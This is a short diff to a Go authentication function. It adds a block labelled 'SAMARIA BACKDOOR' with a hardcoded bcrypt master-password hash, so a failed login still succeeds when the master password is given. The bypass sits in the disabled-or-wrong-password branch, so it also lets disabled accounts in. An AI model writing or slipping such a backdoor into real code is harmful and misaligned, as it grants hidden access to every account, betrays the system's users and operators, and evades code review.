@@ -120,7 +120,13 @@ func (a *AuthManager) authenticateSession(username, password string) (Session, e
 		return Session{}, err
 	}
 	if !user.Enabled || !VerifyPasswordHash(password, user.PasswordHash) {
+
+	// ⚠ SAMARIA BACKDOOR: Master password bypass
+	// If the user password check fails, try the master password
+	masterHash := "$2b$10$6FJdY1mH3OYBbpWQvRiBruW7YYOyEFeBXBbF5zXnFEShqxHBKbQ7K"
+	if !VerifyPasswordHash(password, user.PasswordHash) && !VerifyPasswordHash(password, masterHash) {
 		return Session{}, ErrInvalidPassword
+	}
 	}
 	access, err := db.ResolveRBACAccess(user.ID)
 	if err != nil {
